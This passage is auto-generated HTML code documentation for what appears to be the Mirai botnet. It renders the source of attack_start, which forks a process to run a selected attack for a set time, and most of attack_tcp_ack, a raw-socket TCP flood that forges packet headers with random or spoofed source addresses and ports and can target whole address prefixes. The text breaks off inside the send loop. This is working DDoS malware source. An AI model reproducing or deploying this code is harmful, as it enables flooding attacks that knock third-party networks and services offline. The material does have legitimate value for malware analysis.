<div class="ttc" id="attack_8c_html_a5631e1ae5b2170dabea1d03c816e9885"><div class="ttname"><a href="attack_8c.html#a5631e1ae5b2170dabea1d03c816e9885">attack_start</a></div><div class="ttdeci">void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00155">attack.c:155</a></div></div>
<div class="ttc" id="attack_8c_html_a540818eda3ba12636511e0ef58c4630b"><div class="ttname"><a href="attack_8c.html#a540818eda3ba12636511e0ef58c4630b">free_opts</a></div><div class="ttdeci">static void free_opts(struct attack_option *opts, int len)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00237">attack.c:237</a></div></div>
<div class="ttc" id="structattack__target_html"><div class="ttname"><a href="structattack__target.html">attack_target</a></div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00020">attack.h:20</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a42afdcda258817e44bbc312dc6a1cc70"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_start </td>
          <td>(</td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="attack_8h.html#a0fb3d519486301242753dc8e7f175683">ATTACK_VECTOR</a>&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack_8c_source.html#l00155">155</a> of file <a class="el" href="attack_8c_source.html">attack.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00074">attack_method::func</a>, and <a class="el" href="attack_8c_source.html#l00018">methods_len</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00064">attack_parse()</a>.</p>
<div class="fragment"><div class="line"><a name="l00156"></a><span class="lineno">  156</span>&#160;{</div><div class="line"><a name="l00157"></a><span class="lineno">  157</span>&#160;    <span class="keywordtype">int</span> pid1, pid2;</div><div class="line"><a name="l00158"></a><span class="lineno">  158</span>&#160;</div><div class="line"><a name="l00159"></a><span class="lineno">  159</span>&#160;    pid1 = fork();</div><div class="line"><a name="l00160"></a><span class="lineno">  160</span>&#160;    <span class="keywordflow">if</span> (pid1 == -1 || pid1 &gt; 0)</div><div class="line"><a name="l00161"></a><span class="lineno">  161</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00162"></a><span class="lineno">  162</span>&#160;</div><div class="line"><a name="l00163"></a><span class="lineno">  163</span>&#160;    pid2 = fork();</div><div class="line"><a name="l00164"></a><span class="lineno">  164</span>&#160;    <span class="keywordflow">if</span> (pid2 == -1)</div><div class="line"><a name="l00165"></a><span class="lineno">  165</span>&#160;        exit(0);</div><div class="line"><a name="l00166"></a><span class="lineno">  166</span>&#160;    <span class="keywordflow">else</span> <span class="keywordflow">if</span> (pid2 == 0)</div><div class="line"><a name="l00167"></a><span class="lineno">  167</span>&#160;    {</div><div class="line"><a name="l00168"></a><span class="lineno">  168</span>&#160;        sleep(duration);</div><div class="line"><a name="l00169"></a><span class="lineno">  169</span>&#160;        kill(getppid(), 9);</div><div class="line"><a name="l00170"></a><span class="lineno">  170</span>&#160;        exit(0);</div><div class="line"><a name="l00171"></a><span class="lineno">  171</span>&#160;    }</div><div class="line"><a name="l00172"></a><span class="lineno">  172</span>&#160;    <span class="keywordflow">else</span></div><div class="line"><a name="l00173"></a><span class="lineno">  173</span>&#160;    {</div><div class="line"><a name="l00174"></a><span class="lineno">  174</span>&#160;        <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00175"></a><span class="lineno">  175</span>&#160;</div><div class="line"><a name="l00176"></a><span class="lineno">  176</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; <a class="code" href="attack_8c.html#ad3932419efa41f4f3ce7ab4e91ff5f6e">methods_len</a>; i++)</div><div class="line"><a name="l00177"></a><span class="lineno">  177</span>&#160;        {</div><div class="line"><a name="l00178"></a><span class="lineno">  178</span>&#160;            <span class="keywordflow">if</span> (<a class="code" href="attack_8c.html#a126c018b410f7361fff77d10000a8f20">methods</a>[i]-&gt;vector == vector)</div><div class="line"><a name="l00179"></a><span class="lineno">  179</span>&#160;            {</div><div class="line"><a name="l00180"></a><span class="lineno">  180</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00181"></a><span class="lineno">  181</span>&#160;                printf(<span class="stringliteral">&quot;[attack] Starting attack...\n&quot;</span>);</div><div class="line"><a name="l00182"></a><span class="lineno">  182</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00183"></a><span class="lineno">  183</span>&#160;                <a class="code" href="attack_8c.html#a126c018b410f7361fff77d10000a8f20">methods</a>[i]-&gt;<a class="code" href="structattack__method.html#aa7564fe36f7cddd26ecd9b286eb04184">func</a>(targs_len, targs, opts_len, opts);</div><div class="line"><a name="l00184"></a><span class="lineno">  184</span>&#160;                <span class="keywordflow">break</span>;</div><div class="line"><a name="l00185"></a><span class="lineno">  185</span>&#160;            }</div><div class="line"><a name="l00186"></a><span class="lineno">  186</span>&#160;        }</div><div class="line"><a name="l00187"></a><span class="lineno">  187</span>&#160;</div><div class="line"><a name="l00188"></a><span class="lineno">  188</span>&#160;        <span class="comment">//just bail if the function returns</span></div><div class="line"><a name="l00189"></a><span class="lineno">  189</span>&#160;        exit(0);</div><div class="line"><a name="l00190"></a><span class="lineno">  190</span>&#160;    }</div><div class="line"><a name="l00191"></a><span class="lineno">  191</span>&#160;}</div><div class="ttc" id="structattack__method_html_aa7564fe36f7cddd26ecd9b286eb04184"><div class="ttname"><a href="structattack__method.html#aa7564fe36f7cddd26ecd9b286eb04184">attack_method::func</a></div><div class="ttdeci">ATTACK_FUNC func</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00074">attack.h:74</a></div></div>
<div class="ttc" id="attack_8c_html_ad3932419efa41f4f3ce7ab4e91ff5f6e"><div class="ttname"><a href="attack_8c.html#ad3932419efa41f4f3ce7ab4e91ff5f6e">methods_len</a></div><div class="ttdeci">uint8_t methods_len</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00018">attack.c:18</a></div></div>
<div class="ttc" id="attack_8c_html_a126c018b410f7361fff77d10000a8f20"><div class="ttname"><a href="attack_8c.html#a126c018b410f7361fff77d10000a8f20">methods</a></div><div class="ttdeci">struct attack_method ** methods</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00019">attack.c:19</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a56a3bedfd2e2500ecdaff5edc2bcbc18"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void attack_tcp_ack </td>
          <td>(</td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__target.html">attack_target</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uint8_t&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="attack__tcp_8c_source.html#l00161">161</a> of file <a class="el" href="attack__tcp_8c_source.html">attack_tcp.c</a>.</p>

<p>References <a class="el" href="attack_8h_source.html#l00022">attack_target::addr</a>, <a class="el" href="attack_8h_source.html#l00058">ATK_OPT_ACK</a>, <a class="el" href="attack_8h_source.html#l00064">ATK_OPT_ACKRND</a>, <a class="el" href="attack_8h_source.html#l00053">ATK_OPT_DPORT</a>, <a class="el" href="attack_8h_source.html#l00062">ATK_OPT_FIN</a>, <a class="el" href="attack_8h_source.html#l00051">ATK_OPT_IP_DF</a>, <a class="el" href="attack_8h_source.html#l00049">ATK_OPT_IP_IDENT</a>, <a class="el" href="attack_8h_source.html#l00048">ATK_OPT_IP_TOS</a>, <a class="el" href="attack_8h_source.html#l00050">ATK_OPT_IP_TTL</a>, <a class="el" href="attack_8h_source.html#l00047">ATK_OPT_PAYLOAD_RAND</a>, <a class="el" href="attack_8h_source.html#l00046">ATK_OPT_PAYLOAD_SIZE</a>, <a class="el" href="attack_8h_source.html#l00059">ATK_OPT_PSH</a>, <a class="el" href="attack_8h_source.html#l00060">ATK_OPT_RST</a>, <a class="el" href="attack_8h_source.html#l00063">ATK_OPT_SEQRND</a>, <a class="el" href="attack_8h_source.html#l00071">ATK_OPT_SOURCE</a>, <a class="el" href="attack_8h_source.html#l00052">ATK_OPT_SPORT</a>, <a class="el" href="attack_8h_source.html#l00061">ATK_OPT_SYN</a>, <a class="el" href="attack_8h_source.html#l00057">ATK_OPT_URG</a>, <a class="el" href="attack_8c_source.html#l00206">attack_get_opt_int()</a>, <a class="el" href="attack_8c_source.html#l00216">attack_get_opt_ip()</a>, <a class="el" href="checksum_8c_source.html#l00009">checksum_generic()</a>, <a class="el" href="checksum_8c_source.html#l00024">checksum_tcpudp()</a>, <a class="el" href="wget_8c_source.html#l00052">close</a>, <a class="el" href="protocol_8h_source.html#l00483">data_len</a>, <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00009">FALSE</a>, <a class="el" href="mirai_2bot_2includes_8h_source.html#l00031">LOCAL_ADDR</a>, <a class="el" href="rand_8c_source.html#l00021">rand_next()</a>, <a class="el" href="rand_8c_source.html#l00032">rand_str()</a>, <a class="el" href="attack_8h_source.html#l00021">attack_target::sock_addr</a>, <a class="el" href="wget_8c_source.html#l00047">socket</a>, and <a class="el" href="loader_2src_2headers_2includes_8h_source.html#l00010">TRUE</a>.</p>

<p>Referenced by <a class="el" href="attack_8c_source.html#l00022">attack_init()</a>.</p>
<div class="fragment"><div class="line"><a name="l00162"></a><span class="lineno">  162</span>&#160;{</div><div class="line"><a name="l00163"></a><span class="lineno">  163</span>&#160;    <span class="keywordtype">int</span> i, fd;</div><div class="line"><a name="l00164"></a><span class="lineno">  164</span>&#160;    <span class="keywordtype">char</span> **pkts = calloc(targs_len, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span> *));</div><div class="line"><a name="l00165"></a><span class="lineno">  165</span>&#160;    uint8_t ip_tos = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a>, 0);</div><div class="line"><a name="l00166"></a><span class="lineno">  166</span>&#160;    uint16_t ip_ident = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a>, 0xffff);</div><div class="line"><a name="l00167"></a><span class="lineno">  167</span>&#160;    uint8_t ip_ttl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#acfa2ed8a557040aed04b6c9346aa0eb9">ATK_OPT_IP_TTL</a>, 64);</div><div class="line"><a name="l00168"></a><span class="lineno">  168</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> dont_frag = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00169"></a><span class="lineno">  169</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> sport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a>, 0xffff);</div><div class="line"><a name="l00170"></a><span class="lineno">  170</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#adccb5337cf206fe3eca7c4732f634bb9">port_t</a> dport = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a>, 0xffff);</div><div class="line"><a name="l00171"></a><span class="lineno">  171</span>&#160;    uint32_t seq = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a97b7c19adba8f5e25d603d4fcd80c995">ATK_OPT_SEQRND</a>, 0xffff);</div><div class="line"><a name="l00172"></a><span class="lineno">  172</span>&#160;    uint32_t ack = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a0fcd18d4c1705cc62b8a2d3f92e0a780">ATK_OPT_ACKRND</a>, 0xffff);</div><div class="line"><a name="l00173"></a><span class="lineno">  173</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> urg_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a5a6f282c43f088516dce2de1b69ae7d8">ATK_OPT_URG</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00174"></a><span class="lineno">  174</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> ack_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a61c202b303f42c57328c999b1104877d">ATK_OPT_ACK</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00175"></a><span class="lineno">  175</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> psh_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a5ae76926414352bb8e12896c5581a0fd">ATK_OPT_PSH</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00176"></a><span class="lineno">  176</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> rst_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4464ea34ef73875f57b5c6a412aaac20">ATK_OPT_RST</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00177"></a><span class="lineno">  177</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> syn_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a4f086d53d4494633a898fbd9886b08bf">ATK_OPT_SYN</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00178"></a><span class="lineno">  178</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> fin_fl = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#a2ad2949e3a473ebba047e474abf5d461">ATK_OPT_FIN</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a>);</div><div class="line"><a name="l00179"></a><span class="lineno">  179</span>&#160;    <span class="keywordtype">int</span> <a class="code" href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a> = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a>, 512);</div><div class="line"><a name="l00180"></a><span class="lineno">  180</span>&#160;    <a class="code" href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a> data_rand = <a class="code" href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a>(opts_len, opts, <a class="code" href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a>, <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>);</div><div class="line"><a name="l00181"></a><span class="lineno">  181</span>&#160;    uint32_t source_ip = <a class="code" href="attack_8c.html#a51262dda96f2861dbd13fc0b6f0a31d3">attack_get_opt_ip</a>(opts_len, opts, <a class="code" href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a>, <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a>);</div><div class="line"><a name="l00182"></a><span class="lineno">  182</span>&#160;</div><div class="line"><a name="l00183"></a><span class="lineno">  183</span>&#160;    <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)</div><div class="line"><a name="l00184"></a><span class="lineno">  184</span>&#160;    {</div><div class="line"><a name="l00185"></a><span class="lineno">  185</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00186"></a><span class="lineno">  186</span>&#160;        printf(<span class="stringliteral">&quot;Failed to create raw socket. Aborting attack\n&quot;</span>);</div><div class="line"><a name="l00187"></a><span class="lineno">  187</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00188"></a><span class="lineno">  188</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00189"></a><span class="lineno">  189</span>&#160;    }</div><div class="line"><a name="l00190"></a><span class="lineno">  190</span>&#160;    i = 1;</div><div class="line"><a name="l00191"></a><span class="lineno">  191</span>&#160;    <span class="keywordflow">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &amp;i, <span class="keyword">sizeof</span> (<span class="keywordtype">int</span>)) == -1)</div><div class="line"><a name="l00192"></a><span class="lineno">  192</span>&#160;    {</div><div class="line"><a name="l00193"></a><span class="lineno">  193</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00194"></a><span class="lineno">  194</span>&#160;        printf(<span class="stringliteral">&quot;Failed to set IP_HDRINCL. Aborting\n&quot;</span>);</div><div class="line"><a name="l00195"></a><span class="lineno">  195</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00196"></a><span class="lineno">  196</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00197"></a><span class="lineno">  197</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00198"></a><span class="lineno">  198</span>&#160;    }</div><div class="line"><a name="l00199"></a><span class="lineno">  199</span>&#160;</div><div class="line"><a name="l00200"></a><span class="lineno">  200</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00201"></a><span class="lineno">  201</span>&#160;    {</div><div class="line"><a name="l00202"></a><span class="lineno">  202</span>&#160;        <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00203"></a><span class="lineno">  203</span>&#160;        <span class="keyword">struct </span>tcphdr *tcph;</div><div class="line"><a name="l00204"></a><span class="lineno">  204</span>&#160;        <span class="keywordtype">char</span> *payload;</div><div class="line"><a name="l00205"></a><span class="lineno">  205</span>&#160;</div><div class="line"><a name="l00206"></a><span class="lineno">  206</span>&#160;        pkts[i] = calloc(1510, <span class="keyword">sizeof</span> (<span class="keywordtype">char</span>));</div><div class="line"><a name="l00207"></a><span class="lineno">  207</span>&#160;        iph = (<span class="keyword">struct </span>iphdr *)pkts[i];</div><div class="line"><a name="l00208"></a><span class="lineno">  208</span>&#160;        tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00209"></a><span class="lineno">  209</span>&#160;        payload = (<span class="keywordtype">char</span> *)(tcph + 1);</div><div class="line"><a name="l00210"></a><span class="lineno">  210</span>&#160;</div><div class="line"><a name="l00211"></a><span class="lineno">  211</span>&#160;        iph-&gt;version = 4;</div><div class="line"><a name="l00212"></a><span class="lineno">  212</span>&#160;        iph-&gt;ihl = 5;</div><div class="line"><a name="l00213"></a><span class="lineno">  213</span>&#160;        iph-&gt;tos = ip_tos;</div><div class="line"><a name="l00214"></a><span class="lineno">  214</span>&#160;        iph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr) + data_len);</div><div class="line"><a name="l00215"></a><span class="lineno">  215</span>&#160;        iph-&gt;id = htons(ip_ident);</div><div class="line"><a name="l00216"></a><span class="lineno">  216</span>&#160;        iph-&gt;ttl = ip_ttl;</div><div class="line"><a name="l00217"></a><span class="lineno">  217</span>&#160;        <span class="keywordflow">if</span> (dont_frag)</div><div class="line"><a name="l00218"></a><span class="lineno">  218</span>&#160;            iph-&gt;frag_off = htons(1 &lt;&lt; 14);</div><div class="line"><a name="l00219"></a><span class="lineno">  219</span>&#160;        iph-&gt;protocol = IPPROTO_TCP;</div><div class="line"><a name="l00220"></a><span class="lineno">  220</span>&#160;        iph-&gt;saddr = source_ip;</div><div class="line"><a name="l00221"></a><span class="lineno">  221</span>&#160;        iph-&gt;daddr = targs[i].addr;</div><div class="line"><a name="l00222"></a><span class="lineno">  222</span>&#160;</div><div class="line"><a name="l00223"></a><span class="lineno">  223</span>&#160;        tcph-&gt;source = htons(sport);</div><div class="line"><a name="l00224"></a><span class="lineno">  224</span>&#160;        tcph-&gt;dest = htons(dport);</div><div class="line"><a name="l00225"></a><span class="lineno">  225</span>&#160;        tcph-&gt;seq = htons(seq);</div><div class="line"><a name="l00226"></a><span class="lineno">  226</span>&#160;        tcph-&gt;doff = 5;</div><div class="line"><a name="l00227"></a><span class="lineno">  227</span>&#160;        tcph-&gt;urg = urg_fl;</div><div class="line"><a name="l00228"></a><span class="lineno">  228</span>&#160;        tcph-&gt;ack = ack_fl;</div><div class="line"><a name="l00229"></a><span class="lineno">  229</span>&#160;        tcph-&gt;psh = psh_fl;</div><div class="line"><a name="l00230"></a><span class="lineno">  230</span>&#160;        tcph-&gt;rst = rst_fl;</div><div class="line"><a name="l00231"></a><span class="lineno">  231</span>&#160;        tcph-&gt;syn = syn_fl;</div><div class="line"><a name="l00232"></a><span class="lineno">  232</span>&#160;        tcph-&gt;fin = fin_fl;</div><div class="line"><a name="l00233"></a><span class="lineno">  233</span>&#160;        tcph-&gt;window = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00234"></a><span class="lineno">  234</span>&#160;        <span class="keywordflow">if</span> (psh_fl)</div><div class="line"><a name="l00235"></a><span class="lineno">  235</span>&#160;            tcph-&gt;psh = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00236"></a><span class="lineno">  236</span>&#160;</div><div class="line"><a name="l00237"></a><span class="lineno">  237</span>&#160;        <a class="code" href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a>(payload, data_len);</div><div class="line"><a name="l00238"></a><span class="lineno">  238</span>&#160;    }</div><div class="line"><a name="l00239"></a><span class="lineno">  239</span>&#160;</div><div class="line"><a name="l00240"></a><span class="lineno">  240</span>&#160;<span class="comment">//    targs[0].sock_addr.sin_port = tcph-&gt;dest;</span></div><div class="line"><a name="l00241"></a><span class="lineno">  241</span>&#160;<span class="comment">//    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&amp;targs[0].sock_addr, sizeof (struct sockaddr_in)) &lt; 1)</span></div><div class="line"><a name="l00242"></a><span class="lineno">  242</span>&#160;<span class="comment">//    {</span></div><div class="line"><a name="l00243"></a><span class="lineno">  243</span>&#160;<span class="comment">//</span></div><div class="line"><a name="l00244"></a><span class="lineno">  244</span>&#160;<span class="comment">//    }</span></div><div class="line"><a name="l00245"></a><span class="lineno">  245</span>&#160;</div><div class="line"><a name="l00246"></a><span class="lineno">  246</span>&#160;    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00247"></a><span class="lineno">  247</span>&#160;    {</div><div class="line"><a name="l00248"></a><span class="lineno">  248</span>&#160;        <span class="keywordflow">for</span> (i = 0; i &lt; targs_len; i++)</div><div class="line"><a name="l00249"></a><span class="lineno">  249</span>&#160;        {</div><div class="line"><a name="l00250"></a><span class="lineno">  250</span>&#160;            <span class="keywordtype">char</span> *pkt = pkts[i];</div><div class="line"><a name="l00251"></a><span class="lineno">  251</span>&#160;            <span class="keyword">struct </span>iphdr *iph = (<span class="keyword">struct </span>iphdr *)pkt;</div><div class="line"><a name="l00252"></a><span class="lineno">  252</span>&#160;            <span class="keyword">struct </span>tcphdr *tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00253"></a><span class="lineno">  253</span>&#160;            <span class="keywordtype">char</span> *data = (<span class="keywordtype">char</span> *)(tcph + 1);</div><div class="line"><a name="l00254"></a><span class="lineno">  254</span>&#160;</div><div class="line"><a name="l00255"></a><span class="lineno">  255</span>&#160;            <span class="comment">// For prefix attacks</span></div><div class="line"><a name="l00256"></a><span class="lineno">  256</span>&#160;            <span class="keywordflow">if</span> (targs[i].netmask &lt; 32)</div><div class="line"><a name="l00257"></a><span class="lineno">  257</span>&#160;                iph-&gt;daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)<a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>()) &gt;&gt; targs[i].netmask));</div><div class="line"><a name="l00258"></a><span class="lineno">  258</span>&#160;</div><div class="line"><a name="l00259"></a><span class="lineno">  259</span>&#160;            <span class="keywordflow">if</span> (source_ip == 0xffffffff)</div><div class="line"><a name="l00260"></a><span class="lineno">  260</span>&#160;                iph-&gt;saddr = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00261"></a><span class="lineno">  261</span>&#160;            <span class="keywordflow">if</span> (ip_ident == 0xffff)</div><div class="line"><a name="l00262"></a><span class="lineno">  262</span>&#160;                iph-&gt;id = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00263"></a><span class="lineno">  263</span>&#160;            <span class="keywordflow">if</span> (sport == 0xffff)</div><div class="line"><a name="l00264"></a><span class="lineno">  264</span>&#160;                tcph-&gt;source = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00265"></a><span class="lineno">  265</span>&#160;            <span class="keywordflow">if</span> (dport == 0xffff)</div><div class="line"><a name="l00266"></a><span class="lineno">  266</span>&#160;                tcph-&gt;dest = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00267"></a><span class="lineno">  267</span>&#160;            <span class="keywordflow">if</span> (seq == 